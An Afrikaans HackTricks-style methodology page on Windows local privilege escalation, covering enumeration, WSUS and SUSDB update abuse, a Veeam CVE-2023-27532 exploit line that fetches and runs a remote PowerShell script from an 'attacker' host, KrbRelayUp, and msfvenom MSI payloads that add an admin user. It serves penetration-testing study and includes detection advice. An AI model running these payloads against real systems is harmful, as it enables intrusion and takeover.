# Plaaslike regte-eskalasie in Windows

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om vektore vir plaaslike regte-eskalasie in Windows te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Hierdie bladsy bring algemene metodologie vir regte-eskalasie in Windows saam uit verskeie grondliggende gidse.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Die praktiese enumerasiewerkvloei is ook gebaseer op werkswinkels en kontrolelyste van die gemeenskap.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Die historiese aanvalmateriaal sluit die DerbyCon-aanbieding oor regte-eskalasie in Windows in.<sup>[[5]](#references)</sup>

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows-access tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-sekuriteitskontroles

Daar is verskeie dinge in Windows wat jou kan **verhoed om die stelsel te enumereer**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite op te spoor**. Jy moet die volgende **bladsy lees** en al hierdie **verdedigingsmeganismes enumereer** voordat jy met die enumerasie vir regte-eskalasie begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fisiese toegang kan ook ’n vanlyn UEFI NVRAM-wysiging omskep in DMA voor selflaai en ’n Windows-`SYSTEM`-geheuepleisterketting:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess stille verhoging

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` begin word, kan misbruik word om High IL sonder aanwysings te bereik wanneer AppInfo se kontroles vir veilige paaie omseil word. Kyk hier na die toegewyde werkvloei om UIAccess/Admin Protection te omseil:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die verspreiding van toeganklikheidsregisterinstellings na Secure Desktop kan misbruik word om ’n arbitrêre SYSTEM-registerskrywing uit te voer (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows-weergawes het ook ’n LPE-roete met **SMB-arbitrêre poorte** bekendgestel, waar ’n bevoorregte plaaslike NTLM-verifikasie oor ’n hergebruikte SMB TCP-verbinding teruggespieël word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Stelselinligting

### Enumerasie van weergawe-inligting

Kyk of die Windows-weergawe bekende kwesbaarhede het (kyk ook na die toegepaste pleisters).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Hierdie [werf](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede, wat die **massiewe aanvaloppervlak** toon wat ’n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventariseer die OS-bouweergawe, geïnstalleerde opdaterings en geselekteerde moontlike advisories; verifieer die presiese produk en vervangende opdaterings voordat jy aanvaar dat ’n resultaat van toepassing is.

Vir ’n weergawe-spesifieke plaaslike exploit, kyk na die **argitektuur van die lopende proses** sowel as die OS-argitektuur. Op 64-bis Windows is ’n 32-bis proses onderhewig aan [WOW64-lêerstelselherleiding](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verwys gewoonlik na die 32-bis-stelselgids, terwyl `%windir%\Sysnative` daardie proses toegang tot die oorspronklike stelselgids gee. Die alias is nie vir ’n 64-bis proses beskikbaar nie. ’n OS-bouweergawe of moontlike ontbrekende KB bewys nie dat ’n exploit uitvoerbaar is nie; vergelyk die lopende bouweergawe, geïnstalleerde of vervangende opdatering, prosesargitektuur en exploit-voorvereistes met die [Microsoft-sekuriteitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) vir die presiese kwesbaarheid.

Vir ’n voorbeeld van geheuekorrupsie in ’n diens, sien die [kliëntbeheerde MIDI-gedeeldegeheue-ringposisies](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die gepubliseerde stapeloffsets geld slegs vir die getoetste bouweergawe; om `LOCAL SERVICE` te bereik, is iets anders as die latere [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)-stap na `SYSTEM`.<sup>[[44]](#references)</sup>

**Plaaslik met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-bewaarplekke met exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is enige credential/Juicy-inligting in die omgewingsveranderlikes gestoor?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-geskiedenis

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-transkripsielêers

Jy kan leer hoe om dit te aktiveer by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` is slegs ’n voorbeeld. [PowerShell-transkripsiebeleid](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) skryf gewoonlik na elke gebruiker se Documents-lêergids, maar ’n `OutputDirectory`-instelling of `Start-Transcript -OutputDirectory` kan lêers na ’n gedeelde of versteekte lêergids herlei. Gaan die effektiewe uitvoerpad en lêer-ACL na voordat jy ’n transkripsie hersien: dit kan opdragargumente en uitvoer bevat, insluitend aanmeldbewyse. ’n Leesbare transkripsie is slegs ’n leidraad wanneer die inhoud ’n bruikbare identiteit met hoër voorregte bekend maak én daardie identiteit in die betrokke konteks kan aanmeld.

### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdragaanroepe en dele van skrifte. Volledige uitvoeringsbesonderhede en uitvoerresultate word egter moontlik nie vasgelê nie.

Volg die instruksies in die afdeling "Transkripsielêers" van die dokumentasie om dit te aktiveer, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Om die laaste 15 gebeurtenisse uit PowersShell-logboeke te sien, kan jy die volgende uitvoer:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

’n Volledige rekord van die aktiwiteit en die volledige inhoud van die skrip se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit loop. Hierdie proses bewaar ’n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insig in die proses verskaf.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logboekgebeurtenisse vir die Script Block kan in Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy die volgende gebruik:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internetinstellings

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Aandrywers

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die vroeëre leiding het die risiko soos volg opgesom:

Jy kan die stelsel kompromitteer as die opdaterings met http eerder as http**S** aangevra word.

’n HTTP WSUS-eindpunt is ’n ondersoekwenk vir onderskepping van opdateringmetadata. Uitbuiting hang ook daarvan af of die kliënt daardie WSUS-bediener gebruik, of ’n aanvaller die verkeer daarvan kan onderskep of beheer, en van die kliënt se opdateringvertroue- en installasiebeleid. Die URL alleen bevestig nie kode-uitvoering nie. [Microsoft beveel TLS vir WSUS-metadata aan](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Begin deur te kyk of die netwerk ’n WSUS-opdatering sonder SSL gebruik, deur die volgende in cmd uit te voer:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Of die volgende in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

As jy ’n antwoord soos een van hierdie kry:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Die oorspronklike toepaslikheidsverklaring was:

Dan is dit **uitbuitbaar.** As die laaste registerwaarde gelyk is aan `0`, sal die WSUS-inskrywing geïgnoreer word.

Wanneer `UseWUServer` `1` is, gebruik Windows Update die opgestelde intranetdiens. Dit bevestig ’n voorvereiste vir die HTTP-onderskeppingsroete, maar bewys nie dat onderskepping, die aanvaarding van kwaadwillige opdaterings of installasie met verhoogde regte moontlik is nie. Wanneer dit `0` is, word hierdie spesifieke WSUS-eindpunt nie deur daardie beleid gekies nie.

Om hierdie kwesbaarhede uit te buit, kan jy nutsmiddels soos [Wsuxploit](https://github.com/pimps/wsuxploit) en [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik. Dit is gewapende MiTM-uitbuitingskripte om 'fake' opdaterings in nie-SSL WSUS-verkeer in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Basies is dit die fout wat hierdie kwesbaarheid uitbuit:

> As ons die vermoë het om ons plaaslike gebruiker se proxy te wysig, en Windows Updates die proxy gebruik wat in Internet Explorer se instellings opgestel is, het ons dus die vermoë om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te laat loop om ons eie verkeer te onderskep en kode as ’n gebruiker met verhoogde regte op ons stelsel uit te voer.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, gebruik dit ook daardie gebruiker se sertifikaatstoor. As ons ’n selfondertekende sertifikaat vir die WSUS-gasheernaam genereer en dit by die huidige gebruiker se sertifikaatstoor voeg, kan ons beide HTTP- en HTTPS-WSUS-verkeer onderskep. WSUS gebruik geen HSTS-agtige meganismes om ’n trust-on-first-use-tipe validering van die sertifikaat te implementeer nie. As die gebruiker die aangebiedde sertifikaat vertrou en dit die korrekte gasheernaam het, sal die diens dit aanvaar.

Jy kan hierdie kwesbaarheid met die nutsmiddel [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) uitbuit (sodra dit vrygestel is).

### Opdaterings wat deur WSUS-administrateurs beheer word

’n Afsonderlike roete bestaan wanneer die huidige identiteit opdaterings op ’n WSUS-bediener kan **publiseer en goedkeur**. Kontroleer effektiewe lidmaatskap van die bediener se `WSUS Administrators`-groep en enige gedelegeerde WSUS-toestemmings, en bepaal dan die kliënterekenaargroep wat ’n goedgekeurde opdatering sal ontvang. [Microsoft vereis WSUS Administrator-regte om opdaterings goed te keur](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), en [dokumenteer die vertrouensverhouding vir publisering](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): kliënte moet die ondertekeningsertifikaat vertrou wat vir plaaslik gepubliseerde inhoud gebruik word. Bevestig dat die kandidaat-opdatering onderteken en aanvaar word, op die teiken van toepassing is en in ’n meer bevoorregte konteks geïnstalleer word voordat jy dit as ’n eskalasieroete beskou. ’n HTTP-`WUServer`-waarde of groepnaam alleen bewys nie dat aan hierdie voorwaardes voldoen word nie.

### Misbruik van SUSDB-pasgemaakte opdaterings: ongetekende loonvragte via `.txt`/`.esd`

Dit is ’n ander vertrouensgrensoortreding as die onderskepping van ’n HTTP-WSUS-verbinding: die voorvereiste is voldoende toegang tot die **WSUS-databasis (`SUSDB`) se gestoorde prosedures** om ’n pasgemaakte opdatering te publiseer en goed te keur. Een praktiese toegangspunt is om ’n WSUS-rekenaarrekening stroomop na ’n afsonderlike MSSQL-bediener wat `SUSDB` huisves, af te dwing; die presiese voorvereiste hang van die ontplooiing af, so lys eers `EXECUTE`-toestemmings eerder as om SQL-administrateurregte te veronderstel.<sup>[[38]](#references)[[39]](#references)</sup>

Vir die afsonderlike aanvalroete wat WSUS-kliëntverifikasie vanaf HTTP/8530 na LDAP, SMB of AD CS afdwing, sien [Misbruik van WSUS HTTP vir NTLM-relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Bevestig die relay vanaf die eksterne databasis en prosedureregte

In ontplooiings waar WSUS ’n eksterne SQL Server gebruik, kontroleer eers of die WSUS-bedienerrekening by die databasis kan aanmeld en of NTLM-relay daardie luisterdiens kan bereik. Die bediener se SQL-rol kan toegang tot prosedures vir die publisering van opdaterings bied, selfs wanneer direkte skryftoegang tot tabelle geweier word; ’n mislukte `UPDATE` teen `SUSDB` bewys nie dat publisering geblokkeer is nie. Gaan die effektiewe identiteit, roellidmaatskap en proseduretoestemmings in ’n gemagtigde SQL-sessie na voordat jy ’n pasgemaakte opdatering probeer.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die lewendige proseduredefinisies en die geïnstalleerde `SoftwareDistributionPackage.xsd` is nuttig wanneer geldige opdateringmetadata gerekonstrueer word. ’n Bundelouer en loonvragkind het elk `UpdateIdentity` (fragmenttipe `1`), `LocalizedProperties` (`4`) en `ExtendedProperties` (`2`) nodig; teken die plaaslike hersienings-ID aan wat deur elke `spImportUpdate`-oproep teruggegee word, en hou die bundelverhouding, digests, grootte, inhoud-URL en hersiening konsekwent. Dit is ’n toestandafhanklike publiseerwerkvloei, dus is ’n enkele suksesvolle oproep van ’n gestoorde prosedure nie bewys van kliëntkant-uitvoering nie.<sup>[[38]](#references)</sup>

#### Bou, teiken en keur die opdatering goed

Die werkvloei vir pasgemaakte opdaterings gebruik wettige WSUS-prosedures as ’n beperkte publiseer-API. Die belangrike toestandsoorgange is:<sup>[[38]](#references)</sup>

| Fase | Relevante gestoorde prosedures |
| --- | --- |
| Voer opdateringmetadata in | `spImportUpdate` |
| Stoor voorvereiste-, gelokaliseerde en uitgebreide XML-fragmente | `spSaveXMLFragment` |
| Koppel die inhoudsdigest aan die aanvallerbeheerde URL | `spSetBatchURL` |
| Lys/skep ’n rekenaargroep en voeg die kliënt by | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Keur installasie vir daardie groep goed | `spDeployUpdate` met `@actionID = 0` en `@isAssigned = 1` |

Die lêernaam, digests, grootte en `CommandLineInstallation`-hanteerder moet ooreenstem in die ingevoerde metadata/fragmente. Nadat die inhoud-URL en teikengroep toegewys is, lyk die finale goedkeuring soos volg; gebruik nuwe opdaterings-, groep- en ontplooiingsidentifiseerders in plaas daarvan om voorbeeld-GUID’s te hergebruik.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uitbreidinggedrewe handtekeningomseiling

WSUS verwerp normaalweg arbitrêre ongetekende uitvoerbare inhoud. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` stel die .NET `VerifyFile`-pad egter die sertifikaatkontrolevlag op false wanneer die verskafde lêernaam op `.txt` of `.esd` eindig; `CheckCertificateSignature` word dan oorgeslaan sonder om eers te bewys dat die grepe teks of ’n wettige ESD-beeld is. ’n Onveranderde PE met byvoorbeeld die naam `payload.exe.txt` kan dus inhoudsverifikasie slaag en later deur die opdatering se opdragreël-installasiehanteerder geloods word. Dit is ’n beleid-/tipeverwarringsfout, nie vervalsing van ’n handtekening nie.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-versoenbare staging en outomatisering

Deur `spDeployUpdate` aan te roep, laat WSUS die geregistreerde inhoud ophaal. Die oorsprong moet aan BITS se HTTP-vereistes voldoen: ’n bereikbare URL alleen is nie genoeg nie, omdat die oordrag ’n aanvanklike `HEAD`/`GET`-vloei en byte-range-versoeke gebruik. ’n Bediener sonder Range-ondersteuning veroorsaak WSUS-sinchronisasie-`EventId=364`, wat meld dat BITS die Range-protokolopskrif vereis.<sup>[[39]](#references)</sup>

Die navorsings-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genereer die SQL wat nodig is vir die import/fragment/URL/group/deployment-ketting, sluit ’n aangepaste MSSQL-kliënt in om dit uit te voer, en bevat `BitsWebServer.py` vir inhoudstaging. ’n Minimale aanroeping in ’n gemagtigde lab is:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Onbemande uitvoering en herprobeer-persistensie

Kliëntkant-interaksie hang van beleid af. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opsie `4 - Auto download and schedule install`, laat ’n goedgekeurde opdatering aflaai en installeer volgens die gekonfigureerde skedule, sonder dat die gebruiker dit handmatig hoef te kies. In toetsing is ’n payload waarvan die opdatering misluk/onvolledig gebly het, onmiddellik weer aangebied nadat die callback-proses geëindig het. Herprobeergedrag kan dus ’n herhalende vorm van uitvoeringspersistensie word; dit is opvallend omdat die kliënt ’n mislukte-opdateringstatus wys.<sup>[[39]](#references)</sup>

#### Opsporings- en verhardingspunte

Nuttige bediener- en kliëntkant-punte om vanuit hierdie ketting te ondersoek, is:<sup>[[39]](#references)</sup>

- Oudit die uitvoering van `spCreateTargetGroup`, `spSetBatchURL` en `spDeployUpdate` in `SUSDB`; ondersoek nuwe teikengroepe, eksterne inhoudsbronne, `.txt`/`.esd`-opdateringspayloads en ontplooiings deur onverwagte principals (veral nie-rekeninge).
- Ondersoek `C:\Program Files\Update Services\LogFiles` vir `ContentSyncAgent`, `FileVerified`, die verkeerd gespelde `FileVerficationFailed` en `EventId=364`; vergelyk verifikasie met die payload-uitbreiding en inhoudsmagic, eerder as om die agtervoegsel te vertrou.
- Soek na Windows Update-installasies wat herhaaldelik misluk/herprobeer, en na PE-uitvoering of onverwagte kinderproses-/netwerkaktiwiteit vanuit inhoud met `.txt`- of `.esd`-name.
- Vereis Extended Protection for Authentication op die databasisdiens waar dit ondersteun word, en beperk databas netwerktoegang tot die WSUS-bediener en gemagtigde administrasiestelsels. Beperk en oudit `EXECUTE`-regte op die prosedures vir persoonlike opdaterings.

## Derdeparty-outomatiese opdaterings en Agent IPC (local privesc)

Baie ondernemingsagente stel ’n localhost IPC-oppervlak en ’n bevoorregte opdateringskanaal beskikbaar. As registrasie na ’n aanvaller se bediener gedwing kan word en die opdateringsprogram ’n rogue root CA of swak signer-kontroles vertrou, kan ’n plaaslike gebruiker ’n kwaadwillige MSI aflewer wat die SYSTEM-diens installeer. Sien ’n veralgemeende tegniek (gebaseer op die Netskope stAgentSvc-ketting – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Die oorspronklike weergawe-spesifieke beskrywing en verkenningsnota was:

Veeam B&R < `11.0.1.1261` stel ’n localhost-diens op **TCP/9401** beskikbaar wat boodskappe verwerk wat deur ’n aanvaller beheer word, wat arbitrêre opdragte as **NT AUTHORITY\SYSTEM** moontlik maak.<sup>[[12]](#references)</sup>

- **Verkenning**: bevestig die listener en weergawe, bv. met `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication en Cloud Connect gebruik by verstek ’n kernrugsteundiens op **TCP/9401**. [Veeam's advisory](https://www.veeam.com/kb4424) beskryf die ongeverifieerde openbaarmaking van geënkripteerde databasisbewyse vir konfigurasie binne die rugsteunnetwerkgrens; ’n afsonderlike openbare PoC demonstreer ’n pad na opdraguitvoering as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Die diens kan aan meer as net localhost bind, dus moet jy die werklike adres en PID nagaan.

- **Verkenning**: bevestig dat TCP/9401 aan `Veeam.Backup.Service.exe` behoort, en ondersoek dan die geïnstalleerde produk en pleistermetadata. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` is leidrade, nie ’n volledige pleisterkontrole nie.
- **Vaste basisweergawes**: Veeam lys **11a build 11.0.1.1261 P20230227** en **12 build 12.0.0.1420 P20230223** as die eerste reggestelde vrystellings; vroeëre vrystellings is kwesbaar. ’n Lêerweergawe met vier dele alleen kan nie ’n ongepleisterde basisbuild onderskei van ’n latere pleister op dieselfde buildnommers nie. Verifieer die pleisteridentifiseerder teen die [vendor build history](https://www.veeam.com/kb2680) voordat jy ’n grensbuild as reggestel beskou.
- **Exploit**: plaas ’n PoC soos `VeeamHax.exe` saam met die vereiste Veeam-DLL’s in dieselfde gids, en aktiveer dan ’n SYSTEM-payload oor die plaaslike socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Die diens voer die opdrag as SYSTEM uit.

Die aangehaalde PoC demonstreer opdraguitvoering as SYSTEM wanneer die bykomende voorvereistes nagekom word; die verskaffer se advies beskryf die probleem met die bekendmaking van geloofsbriewe.

## KrbRelayUp

Die oorspronklike beskrywing van die verstekomgewing was:

’n **local privilege escalation**-kwesbaarheid bestaan in Windows-**domein**omgewings onder spesifieke omstandighede. Dit sluit omgewings in waar **LDAP signing nie afgedwing word nie,** gebruikers selfregte het waarmee hulle **Resource-Based Constrained Delegation (RBCD)** kan instel, en gebruikers rekenaars binne die domein kan skep. Dit is belangrik om daarop te let dat aan hierdie **vereistes** met **verstekinstellings** voldoen word.

’n Plaaslike Kerberos-relay kan ’n aanmelding met laer voorregte laat oorgaan in ’n bevoorregte skryfbewerking in die gids wanneer ’n geskikte COM-bediener staaf en die gerelayeerde prinsipel regte op die teikenobjek het. [KrbRelay-dokumentasie](https://github.com/cube0x0/KrbRelay) beskryf LDAP-skryfbewerkings vir beide RBCD en `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp outomatiseer sommige van hierdie roetes. ’n RBCD-ketting vereis toepaslike delegering en regte op die teikenobjek, terwyl ’n shadow-credential-ketting skryfre regte vir sleutelbewyse en ’n KDC vereis wat die sertifikaatstawingsroete ondersteun. Nie een van die roetes volg bloot uit lidmaatskap van die domein nie.

Gaan die werklike DC se beleid vir [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) en [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) na, asook die gerelayeerde identiteit se objek-ACL en die gekose COM-klas se stawings- en nabootsingsvlakke. Die oproeper se aanmeldingtipe en geloofsbriewekonteks is belangrik: ’n WinRM-sessie kan anders optree as ’n interaktiewe aanmelding of ’n aanmelding met nuwe geloofsbriewe. Firewall-/OXID-roetering en geïnstalleerde opdaterings kan ook die resultaat verander. Behandel ’n permissiewe beleid of ooreenstemmende ACL as ’n kandidaat vir hersiening; passiewe enumerasie behoort nie COM-coercion, relay-stawing of gidsskryfbewerkings te aktiveer nie. ’n Shadow credential vir ’n masjienrekening kan tot ’n masjienticket lei en, slegs as daardie rekening die vereiste regte vir gidsreplikasie het, tot ’n afsonderlike DCSync-roete.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die aanval se verloop, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**As** hierdie 2 registerwaardes **geaktiveer** is (waarde **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

